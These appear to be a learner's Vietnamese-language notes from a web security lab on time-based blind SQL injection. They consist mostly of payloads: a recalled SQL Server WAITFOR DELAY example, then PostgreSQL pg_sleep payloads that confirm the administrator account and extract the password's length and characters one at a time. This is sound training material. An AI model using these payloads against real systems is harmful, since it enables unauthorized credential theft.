# Kiến thức cũ:
Bài trc lab có lấy vid dụ về lệnh của Microsoft SQL Server
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

# Lab 12:
- '--
- ' SELECT SLEEP(5)-- --> error
- ' AND SELECT SLEEP(5)-- --> error
- ' pg_sleep(5)-- --> error
- ' || pg_sleep(5)--

- ' || SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE '' END--
--> error

- ' || (SELECT pg_sleep(5))--
- ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE '' END)--
- ' || (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(5) ELSE '' END FROM users)--

- ' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = 20) THEN pg_sleep(5) ELSE '' END FROM users)--

- ' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,1,1) = 'a') THEN pg_sleep(5) ELSE '' END FROM users)--


